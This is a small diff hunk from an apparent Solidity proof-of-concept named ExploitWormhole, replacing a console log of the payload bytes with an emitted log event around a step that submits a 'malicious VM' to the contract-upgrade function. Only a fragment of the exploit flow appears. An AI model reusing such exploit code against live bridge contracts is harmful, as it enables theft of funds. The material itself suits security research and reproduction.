@@ -236,7 +236,7 @@ contract ExploitWormhole is TestHarness {
         vm = parseVM(_vm);
 
         console.log("[2] Submitting malicious VM to upgrade the contract...");
-        console.logBytes(vm.payload);
+        emit log_named_bytes("Payload", vm.payload);
         wormholeImpl.submitContractUpgrade(_vm);
     }
 
